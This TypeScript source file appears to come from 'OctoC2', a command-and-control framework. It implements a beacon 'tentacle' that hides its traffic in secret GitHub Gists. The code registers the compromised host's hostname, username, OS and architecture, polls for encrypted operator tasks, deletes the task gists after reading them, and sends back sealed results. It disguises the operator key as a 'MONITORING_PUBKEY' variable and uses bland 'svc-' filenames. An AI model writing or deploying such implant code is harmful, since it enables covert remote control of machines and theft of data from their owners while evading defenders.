/**
 * OctoC2 — GistTentacle (Tentacle 6 — Gist storage channel)
 *
 * Uses GitHub Gists (secret) as an invisible storage channel.
 * Secret gists are not indexed by search engines and require auth to access.
 *
 * Gist layout (all secret gists, one file per gist):
 *   svc-a-{id8}.json  —  Beacon → Server  ACK / registration payload
 *   svc-t-{id8}.json  —  Server → Beacon  Encrypted Task[] blob
 *   svc-r-{id8}.json  —  Beacon → Server  Sealed TaskResult blob
 *
 * Crypto:
 *   Incoming tasks (server → beacon): crypto_box (operator secret + beacon public)
 *   Outgoing results (beacon → server): crypto_box_seal (operator public key)
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  decryptBox, sealBox,
  bytesToBase64, base64ToBytes,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

export class GistTentacle extends BaseTentacle {
  readonly kind = "gist" as const;

  private operatorPublicKey: Uint8Array | null = null;
  private ackSent    = false;
  private ackGistId: string | null = null;
  private taskGistId: string | null = null;
  private lastTaskUpdatedAt: string | null = null;

  // ── Filename helpers ─────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  private get ackFilename(): string    { return `svc-a-${this.id8}.json`; }
  private get taskFilename(): string   { return `svc-t-${this.id8}.json`; }
  private get resultFilename(): string { return `svc-r-${this.id8}.json`; }

  // ── Availability ─────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.gists.list({ per_page: 1 });
      return true;
    } catch {
      return false;
    }
  }

  // ── Operator key resolution ───────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.operatorPublicKey) return this.operatorPublicKey;
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (!b64) throw new Error("GistTentacle: MONITORING_PUBKEY variable not set");
    const key = await base64ToBytes(b64);
    if (key.length !== 32) throw new Error("GistTentacle: operator public key is not 32 bytes");
    this.operatorPublicKey = key;
    return key;
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    let operatorPubKey: Uint8Array;
    try {
      operatorPubKey = await this.getOperatorPublicKey();
    } catch {
      return [];
    }

    // 1. Send ACK gist on first checkin (registers this beacon with GistChannel)
    if (!this.ackSent) {
      const ackContent = JSON.stringify({
        beaconId:  this.config.id,
        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
        hostname:  payload.hostname,
        username:  payload.username,
        os:        payload.os,
        arch:      payload.arch,
        checkinAt: payload.checkinAt,
      });
      const ackResp = await this.octokit.rest.gists.create({
        public: false,
        files: {
          [this.ackFilename]: { content: ackContent },
        },
      } as any);
      this.ackGistId = ackResp.data.id ?? null;
      this.ackSent = true;
    }

    // 2. Poll for task gist
    const listResp = await this.octokit.rest.gists.list({ per_page: 100 });
    const taskGist = listResp.data.find(
      (g: any) => g.files && g.files[this.taskFilename]
    );

    if (!taskGist) {
      this.taskGistId = null;
      this.lastTaskUpdatedAt = null;
      return [];
    }

    this.taskGistId = taskGist.id;

    // 3. Change detector — use updated_at as a simple version stamp
    const updatedAt: string = (taskGist as any).updated_at ?? "";
    if (updatedAt === this.lastTaskUpdatedAt) return [];
    this.lastTaskUpdatedAt = updatedAt;

    // 4. Fetch full gist content
    let rawContent: string;
    try {
      const fullResp = await this.octokit.rest.gists.get({ gist_id: this.taskGistId });
      const fileEntry = (fullResp.data as any).files?.[this.taskFilename];
      rawContent = fileEntry?.content ?? "";
      if (!rawContent) return [];
    } catch {
      return [];
    }

    // 5. Decrypt
    let tasks: Task[];
    try {
      const envelope = JSON.parse(rawContent) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 6. Delete the task gist (prevents re-delivery)
    try {
      await this.octokit.rest.gists.delete({ gist_id: this.taskGistId });
      this.taskGistId = null;
      this.lastTaskUpdatedAt = null;
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    const operatorPubKey = await this.getOperatorPublicKey();

    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
    await this.octokit.rest.gists.create({
      public: false,
      files: {
        [this.resultFilename]: { content: sealed },
      },
    } as any);
  }

  // ── Teardown ─────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    if (this.ackGistId) {
      try {
        await this.octokit.rest.gists.delete({ gist_id: this.ackGistId });
      } catch { /* best-effort */ }
    }
  }
}
